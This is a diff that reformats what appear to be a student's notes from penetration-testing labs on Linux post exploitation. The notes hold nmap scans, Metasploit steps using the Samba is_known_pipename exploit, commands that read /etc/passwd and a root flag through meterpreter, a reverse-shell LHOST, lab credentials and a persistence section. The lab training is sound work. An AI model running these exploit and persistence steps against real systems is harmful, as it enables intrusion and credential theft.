@@ -1,15 +1,11 @@
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Post Exploitation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Post Exploitation Lab I
-=> file-sharing service on a Linux server
-
-nmap -sV -sC demo.ine.local
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-msfconsole -q
+# Linux Post Exploitation
+## Post Exploitation Lab I
+	=> file-sharing service on a Linux server
+	nmap -sV -sC demo.ine.local
+	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	msfconsole -q
 	search linux samba
 	use exploit/linux/samba/is_known_pipename
 	set RHOST demo.ine.local
@@ -133,8 +129,7 @@ msfconsole -q
 	sessions -i 2
 	cat /etc/passwd
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Privilege Escalation-Rootkit Scanner
+## Privilege Escalation-Rootkit Scanner
 	=> vulnerable Rootkit Scanner
 	| Username | Password | | jackie | password |
 
@@ -182,14 +177,13 @@ Privilege Escalation-Rootkit Scanner
 	set LHOST 192.237.219.2
 	exploit
 	meterpreter > cat /root/flag
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Post Exploitation Lab II
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-nmap -sV -sC demo.ine.local
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
+## Post Exploitation Lab II
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-msfconsole -q 
+	nmap -sV -sC demo.ine.local
+	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	msfconsole -q 
 	search linux samba
 	use exploit/linux/samba/is_known_pipename
 	set RHOST demo.ine.local
@@ -263,10 +257,9 @@ msfconsole -q
 	set SESSION 1
 
 	[+] Storing new private key 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Establishing Persistence On Linux
-建立持久存取
-| Username | Password | | jackie | password |
+## Establishing Persistence On Linux
+	建立持久存取
+	| Username | Password | | jackie | password |
 
 	nmap -sV -sC demo.ine.local
 	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
